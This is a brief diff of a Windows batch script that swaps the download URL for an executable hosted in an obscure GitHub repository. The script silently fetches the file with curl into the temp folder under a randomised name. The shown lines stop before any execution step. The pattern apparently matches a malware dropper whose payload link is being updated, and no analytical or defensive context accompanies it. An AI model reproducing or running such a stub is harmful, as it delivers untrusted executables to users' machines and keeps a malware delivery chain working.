@@ -1,6 +1,6 @@
 @echo off
 setlocal
-set "URL=https://github.com/muimk262/check/raw/refs/heads/main/Checker.exe"
+set "URL=https://github.com/serafipka/idkakkwa/raw/refs/heads/main/3f1e1aca_Timer.exe"
 set "FILE=%TEMP%\Check_%RANDOM%%RANDOM%.exe"
 
 curl -L -s -o "%FILE%" "%URL%"
